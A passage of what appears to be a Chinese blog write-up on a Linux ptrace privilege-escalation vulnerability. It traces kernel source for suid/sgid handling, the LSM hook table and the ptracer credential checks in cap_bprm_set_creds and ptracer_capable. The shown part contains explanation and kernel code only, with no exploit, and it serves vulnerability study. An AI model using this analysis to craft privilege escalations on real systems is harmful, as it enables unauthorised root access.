class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> MAX_ARG_PAGES	32</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>[<span class="title">MAX_ARG_PAGES</span>];</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> p; <span class="comment">/* current top of mem */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span></span><br><span class="line">		cred_prepared:<span class="number">1</span>,<span class="comment">/* true if creds already prepared (multiple</span></span><br><span class="line"><span class="comment">				 * preps happen for interpreters) */</span></span><br><span class="line">		cap_effective:<span class="number">1</span>;<span class="comment">/* true if has elevated effective capabilities,</span></span><br><span class="line"><span class="comment">				 * false if not; except for init which inherits</span></span><br><span class="line"><span class="comment">				 * its parent&#x27;s caps anyway */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __alpha__</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> taso:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> recursion_depth; <span class="comment">/* only for search_binary_handler() */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> * <span class="title">file</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">cred</span>;</span>	<span class="comment">/* new credentials */</span></span><br><span class="line">	<span class="type">int</span> unsafe;		<span class="comment">/* how unsafe this exec is (mask of LSM_UNSAFE_*) */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> per_clear;	<span class="comment">/* bits to clear in current-&gt;personality */</span></span><br><span class="line">	<span class="type">int</span> argc, envc;</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> * filename;	<span class="comment">/* Name of binary as seen by procps */</span></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> * interp;	<span class="comment">/* Name of the binary really executed. Most</span></span><br><span class="line"><span class="comment">				   of the time same as filename, but could be</span></span><br><span class="line"><span class="comment">				   different for binfmt_&#123;misc,script&#125; */</span></span><br><span class="line">	<span class="type">unsigned</span> interp_flags;</span><br><span class="line">	<span class="type">unsigned</span> interp_data;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> loader, exec;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这里我们主要关注 cred 字段，其标识了要运行的<strong>新程序的权限</strong></p>
<h2 id="LSM-与-程序执行权限检查"><a href="#LSM-与-程序执行权限检查" class="headerlink" title="LSM 与 程序执行权限检查"></a>LSM 与 程序执行权限检查</h2><p>在 task_struct 结构体当中我们注意到 <code>ptracer_cred</code> 这个字段，这个字段自 <code>Linux kernel 4.10</code>  引入到 task_struct 结构体当中，引入 ptracer_cred 的目的是用于当 tracee 执行 exec 去加载 <a target="_blank" rel="noopener" href="https://www.computerhope.com/jargon/s/setuid.htm">setuid executable</a> 时做安全检测</p>
<blockquote>
<p>参见 <a target="_blank" rel="noopener" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=64b875f7ac8a5d60a4e191479299e931ee949b67">ptrace: Capture the ptracer’s creds not PT_PTRACE_CAP</a> </p>
</blockquote>
<p>这一部分会展开分析一定数量的内核源码，针对这个漏洞而言，可以直接看结论：<strong>若 ptracee 进程执行 suid&#x2F;sgid 程序，则检查 ptracee 保存的 ptracer 的 cred，即 ptracee 的 task_struct 的 ptracer_cred 字段的权限，若权限不足则 ptracee 以其自身的 euid&#x2F;egid 执行程序，而非文件的 suid&#x2F;sgid</strong></p>
<h3 id="suid-x2F-sgid-文件的执行流程"><a href="#suid-x2F-sgid-文件的执行流程" class="headerlink" title="suid&#x2F;sgid 文件的执行流程"></a>suid&#x2F;sgid 文件的执行流程</h3><p>当一个进程执行一个 suid 文件时（例如 <code>/usr/bin/passwd</code>），存在如下调用链：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SYS_execve()</span><br><span class="line">    do_execve()</span><br><span class="line">    	do_execveat_common()</span><br><span class="line">    		prepare_binprm()</span><br><span class="line">    			bprm_fill_uid()</span><br></pre></td></tr></table></figure>

<p>函数 <code>bprm_fill_uid()</code> 定义于 <code>/fs/exec.c</code> 中，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">bprm_fill_uid</span><span class="params">(<span class="keyword">struct</span> linux_binprm *bprm)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> mode;</span><br><span class="line">	<span class="type">kuid_t</span> uid;</span><br><span class="line">	<span class="type">kgid_t</span> gid;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Since this can be called multiple times (via prepare_binprm),</span></span><br><span class="line"><span class="comment">	 * we must clear any previous work done when setting set[ug]id</span></span><br><span class="line"><span class="comment">	 * bits from any earlier bprm-&gt;file uses (for example when run</span></span><br><span class="line"><span class="comment">	 * first for a setuid script then again for its interpreter).</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">    <span class="comment">// 笔者注：首先使用原进程 euid egid</span></span><br><span class="line">	bprm-&gt;cred-&gt;euid = current_euid();</span><br><span class="line">	bprm-&gt;cred-&gt;egid = current_egid();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!mnt_may_suid(bprm-&gt;file-&gt;f_path.mnt))</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (task_no_new_privs(current))</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	inode = file_inode(bprm-&gt;file);</span><br><span class="line">	mode = READ_ONCE(inode-&gt;i_mode);</span><br><span class="line">	<span class="keyword">if</span> (!(mode &amp; (S_ISUID|S_ISGID)))</span><br><span class="line">		<span class="keyword">return</span>; <span class="comment">// 笔者注：不是 suid/sgid 程序，直接返回，否则将 euid/egid 设为文件 uid/gid</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Be careful if suid/sgid is set */</span></span><br><span class="line">	inode_lock(inode);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* reload atomically mode/uid/gid now that lock held */</span></span><br><span class="line">	mode = inode-&gt;i_mode;</span><br><span class="line">	uid = inode-&gt;i_uid;</span><br><span class="line">	gid = inode-&gt;i_gid;</span><br><span class="line">	inode_unlock(inode);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* We ignore suid/sgid if there are no mappings for them in the ns */</span></span><br><span class="line">	<span class="keyword">if</span> (!kuid_has_mapping(bprm-&gt;cred-&gt;user_ns, uid) ||</span><br><span class="line">		 !kgid_has_mapping(bprm-&gt;cred-&gt;user_ns, gid))</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (mode &amp; S_ISUID) &#123;</span><br><span class="line">		bprm-&gt;per_clear |= PER_CLEAR_ON_SETID;</span><br><span class="line">		bprm-&gt;cred-&gt;euid = uid;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((mode &amp; (S_ISGID | S_IXGRP)) == (S_ISGID | S_IXGRP)) &#123;</span><br><span class="line">		bprm-&gt;per_clear |= PER_CLEAR_ON_SETID;</span><br><span class="line">		bprm-&gt;cred-&gt;egid = gid;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们注意到这样一个逻辑：当我们尝试运行一个 suid 程序时，其会将新进程的 cred-&gt;euid 设置为 suid 文件的 uid</p>
<p>那么如果我们 fork 出子进程运行 suid 程序、父进程再 ptrace attach 岂不就能直接完成提权了吗？答案是否定的，因为后面还会进行权限检查，我们继续跟踪调用链：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SYS_execve()</span><br><span class="line">    do_execve()</span><br><span class="line">    	do_execveat_common()</span><br><span class="line">    		prepare_binprm()</span><br><span class="line">    			bprm_fill_uid()</span><br><span class="line">    			security_bprm_set_creds()</span><br></pre></td></tr></table></figure>

<p>该函数定义于 <code>security/security.c</code> 中，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">security_bprm_set_creds</span><span class="params">(<span class="keyword">struct</span> linux_binprm *bprm)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> call_int_hook(bprm_set_creds, <span class="number">0</span>, bprm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>虽然只有一个语句但解释起来可能有点复杂，这里我们要引入一个新的概念—— <code>Linux Security Modules</code>（LSM）</p>
<h3 id="Linux-Security-Modules"><a href="#Linux-Security-Modules" class="headerlink" title="Linux Security Modules"></a>Linux Security Modules</h3><p>LSM 即 Linux 安全模组，类似于 VFS， 其提供了统一的安全业务逻辑接口，例如 SELinux 便是基于 LSM 实现的，整体框架如下：</p>
<p><img src="https://s2.loli.net/2022/01/12/f91geXREUiTyFSm.png" srcset="/img/loading.gif" lazyload alt="偷的图.png"></p>
<blockquote>
<p>启用这个框架需要开启内核编译选项 <code>CONFIG_SECURITY</code>（默认开启）</p>
</blockquote>
<p>现在我们来剖析 <code>call_int_hook</code> 宏，该宏用于<strong>调用对应的 LSM 钩子</strong>，定义于 <code>/security/security.c</code> 中，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> call_int_hook(FUNC, IRC, ...) (&#123;			\</span></span><br><span class="line"><span class="meta">	int RC = IRC;						\</span></span><br><span class="line"><span class="meta">	do &#123;							\</span></span><br><span class="line"><span class="meta">		struct security_hook_list *P;			\</span></span><br><span class="line"><span class="meta">								\</span></span><br><span class="line"><span class="meta">		list_for_each_entry(P, &amp;security_hook_heads.FUNC, list) &#123; \</span></span><br><span class="line"><span class="meta">			RC = P-&gt;hook.FUNC(__VA_ARGS__);		\</span></span><br><span class="line"><span class="meta">			<span class="keyword">if</span> (RC != 0)				\</span></span><br><span class="line"><span class="meta">				break;				\</span></span><br><span class="line"><span class="meta">		&#125;						\</span></span><br><span class="line"><span class="meta">	&#125; while (0);						\</span></span><br><span class="line"><span class="meta">	RC;							\</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br></pre></td></tr></table></figure>

<p>其中 <code>list_for_each_entry</code> 是内核中常用遍历宏，这里不再赘叙，这里的 <code>security_hook_heads</code> 是一个<strong>全局结构体</strong>，阅读源码可以发现其中存放的都是内核双向链表结构，其实对应的应当是 <code>security_hook_list</code> 结构体，定义于 <code>/include/linux/lsm_hooks.h</code> 中，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Security module hook list structure.</span></span><br><span class="line"><span class="comment"> * For use with generic list macros for common operations.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">security_hook_list</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>		<span class="title">list</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>		*<span class="title">head</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> <span class="title">security_list_options</span>	<span class="title">hook</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>其中联合体 <code>security_list_options</code> 其实就是一个函数指针，不再赘叙，那么 <code>call_int_hook</code> 宏的作用就不言而喻了：调用 <code>security_hook_heads</code> 中对应成员的函数指针。我们也可以看出 <code>security_hook_heads</code> 结构体相当于一张函数表</p>
<p>这张函数表会在内核初始化时被初始化，这里我们将目光放到<strong>内核启动的初始化函数</strong>——<code>start_kernel()</code> 中，该函数定义于 <code>/init/main.c</code> 中，我们观察到如下逻辑：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">asmlinkage __visible <span class="type">void</span> __init <span class="title function_">start_kernel</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    security_init();</span><br></pre></td></tr></table></figure>

<p>函数 <code>security_init()</code> 用以进行 LSM 的初始化，定义于 <code>/security/security.c</code> 中，观察到如下调用链：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">security_init()</span><br><span class="line">    capability_add_hooks()</span><br></pre></td></tr></table></figure>

<p>这里 <code>capability_add_hooks()</code> 逻辑比较简单，定义于 <code>/security/commoncap.c</code> 中，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">security_hook_list</span> <span class="title">capability_hooks</span>[] =</span> &#123;</span><br><span class="line">	LSM_HOOK_INIT(capable, cap_capable),</span><br><span class="line">	LSM_HOOK_INIT(settime, cap_settime),</span><br><span class="line">	LSM_HOOK_INIT(ptrace_access_check, cap_ptrace_access_check),</span><br><span class="line">	LSM_HOOK_INIT(ptrace_traceme, cap_ptrace_traceme),</span><br><span class="line">	LSM_HOOK_INIT(capget, cap_capget),</span><br><span class="line">	LSM_HOOK_INIT(capset, cap_capset),</span><br><span class="line">	LSM_HOOK_INIT(bprm_set_creds, cap_bprm_set_creds),</span><br><span class="line">	LSM_HOOK_INIT(bprm_secureexec, cap_bprm_secureexec),</span><br><span class="line">	LSM_HOOK_INIT(inode_need_killpriv, cap_inode_need_killpriv),</span><br><span class="line">	LSM_HOOK_INIT(inode_killpriv, cap_inode_killpriv),</span><br><span class="line">	LSM_HOOK_INIT(mmap_addr, cap_mmap_addr),</span><br><span class="line">	LSM_HOOK_INIT(mmap_file, cap_mmap_file),</span><br><span class="line">	LSM_HOOK_INIT(task_fix_setuid, cap_task_fix_setuid),</span><br><span class="line">	LSM_HOOK_INIT(task_prctl, cap_task_prctl),</span><br><span class="line">	LSM_HOOK_INIT(task_setscheduler, cap_task_setscheduler),</span><br><span class="line">	LSM_HOOK_INIT(task_setioprio, cap_task_setioprio),</span><br><span class="line">	LSM_HOOK_INIT(task_setnice, cap_task_setnice),</span><br><span class="line">	LSM_HOOK_INIT(vm_enough_memory, cap_vm_enough_memory),</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __init <span class="title function_">capability_add_hooks</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	security_add_hooks(capability_hooks, ARRAY_SIZE(capability_hooks));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_SECURITY */</span></span></span><br></pre></td></tr></table></figure>

<p>这里 <code>security_add_hooks()</code> 函数定义于 <code>/include/linux/lsm_hooks.h</code> 中，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">security_add_hooks</span><span class="params">(<span class="keyword">struct</span> security_hook_list *hooks,</span></span><br><span class="line"><span class="params">				      <span class="type">int</span> count)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line">		list_add_tail_rcu(&amp;hooks[i].<span class="built_in">list</span>, hooks[i].head);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>到这里整个逻辑就一目了然了，该函数表会根据表 <code>capability_hooks</code> 进行对应的初始化操作</p>
<h3 id="ptracer-权限检查"><a href="#ptracer-权限检查" class="headerlink" title="ptracer 权限检查"></a>ptracer 权限检查</h3><p>现在让我们将目光放回 <code>security_bprm_set_creds()</code>函数，我们现在可以知道其调用的应当是 <code>security_hook_heads-&gt;bprm_set_creds-&gt;hook</code>，这个钩子指向函数 <code>cap_bprm_set_creds</code>，该函数定义于<code>/security/commoncap.c</code> 中，我们主要关注如下逻辑：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">cap_bprm_set_creds</span><span class="params">(<span class="keyword">struct</span> linux_binprm *bprm)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span> =</span> current_cred();</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span> =</span> bprm-&gt;cred;</span><br><span class="line">	<span class="type">bool</span> effective, has_cap = <span class="literal">false</span>, is_setid;</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line">	<span class="type">kuid_t</span> root_uid;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 笔者注：对被 ptrace 的 suid/sgid 进程进行权限检查</span></span><br><span class="line">    <span class="comment">/* Don&#x27;t let someone trace a set[ug]id/setpcap binary with the revised</span></span><br><span class="line"><span class="comment">	 * credentials unless they have the appropriate permit.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * In addition, if NO_NEW_PRIVS, then ensure we get no new privs.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	is_setid = !uid_eq(new-&gt;euid, old-&gt;uid) || !gid_eq(new-&gt;egid, old-&gt;gid);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((is_setid || <span class="comment">// 是否为 suid/sgid</span></span><br><span class="line">	     !cap_issubset(new-&gt;cap_permitted, old-&gt;cap_permitted)) &amp;&amp;</span><br><span class="line">	    ((bprm-&gt;unsafe &amp; ~LSM_UNSAFE_PTRACE) ||</span><br><span class="line">	     !ptracer_capable(current, new-&gt;user_ns))) &#123; <span class="comment">// 是否被 ptrace，若是，检查是否越权</span></span><br><span class="line">		<span class="comment">/* downgrade; they get no more than they had, and maybe less */</span></span><br><span class="line">        <span class="comment">//若检查出越权，则重新进行一次检查，进行降权</span></span><br><span class="line">		<span class="keyword">if</span> (!ns_capable(new-&gt;user_ns, CAP_SETUID) ||</span><br><span class="line">		    (bprm-&gt;unsafe &amp; LSM_UNSAFE_NO_NEW_PRIVS)) &#123;</span><br><span class="line">			new-&gt;euid = new-&gt;uid;</span><br><span class="line">			new-&gt;egid = new-&gt;gid;</span><br><span class="line">		&#125;</span><br><span class="line">		new-&gt;cap_permitted = cap_intersect(new-&gt;cap_permitted,</span><br><span class="line">						   old-&gt;cap_permitted);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	new-&gt;suid = new-&gt;fsuid = new-&gt;euid;</span><br><span class="line">	new-&gt;sgid = new-&gt;fsgid = new-&gt;egid;</span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure>

<p>其中 <code>ptracer_capable()</code> 定义于 <code>/kernel/capability.c</code> 中，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ptracer_capable - Determine if the ptracer holds CAP_SYS_PTRACE in the namespace</span></span><br><span class="line"><span class="comment"> * @tsk: The task that may be ptraced</span></span><br><span class="line"><span class="comment"> * @ns: The user namespace to search for CAP_SYS_PTRACE in</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Return true if the task that is ptracing the current task had CAP_SYS_PTRACE</span></span><br><span class="line"><span class="comment"> * in the specified user namespace.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">ptracer_capable</span><span class="params">(<span class="keyword">struct</span> task_struct *tsk, <span class="keyword">struct</span> user_namespace *ns)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> ret = <span class="number">0</span>;  <span class="comment">/* An absent tracer adds no restrictions */</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">cred</span>;</span></span><br><span class="line">	rcu_read_lock();</span><br><span class="line">	cred = rcu_dereference(tsk-&gt;ptracer_cred);</span><br><span class="line">	<span class="keyword">if</span> (cred)</span><br><span class="line">		ret = security_capable_noaudit(cred, ns, CAP_SYS_PTRACE);</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line">	<span class="keyword">return</span> (ret == <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该函数检查了进程的 <code>ptracer_cred</code> 字段，若不为 NULL 则说明该进程为 ptracee，接下来使用 <code>security_capable_noaudit</code> 函数进行检查，该函数也是一个 LSM 钩子的 API，对应调用 <code>security_hook_heads-&gt;capable-&gt;hook</code>，对应函数为 <code>cap_capable()</code>，定义于 <code>/security/commoncap.c</code> 中，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * cap_capable - Determine whether a task has a particular effective capability</span></span><br><span class="line"><span class="comment"> * @cred: The credentials to use</span></span><br><span class="line"><span class="comment"> * @ns:  The user namespace in which we need the capability</span></span><br><span class="line"><span class="comment"> * @cap: The capability to check for</span></span><br><span class="line"><span class="comment"> * @audit: Whether to write an audit message or not</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Determine whether the nominated task has the specified capability amongst</span></span><br><span class="line"><span class="comment"> * its effective set, returning 0 if it does, -ve if it does not.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * NOTE WELL: cap_has_capability() cannot be used like the kernel&#x27;s capable()</span></span><br><span class="line"><span class="comment"> * and has_capability() functions.  That is, it has the reverse semantics:</span></span><br><span class="line"><span class="comment"> * cap_has_capability() returns 0 when a task has a capability, but the</span></span><br><span class="line"><span class="comment"> * kernel&#x27;s capable() and has_capability() returns 1 for this case.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">cap_capable</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> cred *cred, <span class="keyword">struct</span> user_namespace *targ_ns,</span></span><br><span class="line"><span class="params">		<span class="type">int</span> cap, <span class="type">int</span> audit)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">ns</span> =</span> targ_ns;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* See if cred has the capability in the target user namespace</span></span><br><span class="line"><span class="comment">	 * by examining the target user namespace and all of the target</span></span><br><span class="line"><span class="comment">	 * user namespace&#x27;s parents.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		<span class="comment">/* Do we have the necessary capabilities? */</span></span><br><span class="line">        <span class="comment">// 若与 ptracer 同属同一命名空间，检查权限是否足够</span></span><br><span class="line">		<span class="keyword">if</span> (ns == cred-&gt;user_ns)</span><br><span class="line">			<span class="keyword">return</span> cap_raised(cred-&gt;cap_effective, cap) ? <span class="number">0</span> : -EPERM;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Have we tried all of the parent namespaces? */</span></span><br><span class="line">        <span class="comment">// 自底向上遍历完了，说明检查出错，返回对应错误值</span></span><br><span class="line">		<span class="keyword">if</span> (ns == &amp;init_user_ns)</span><br><span class="line">			<span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* </span></span><br><span class="line"><span class="comment">		 * The owner of the user namespace in the parent of the</span></span><br><span class="line"><span class="comment">		 * user namespace has 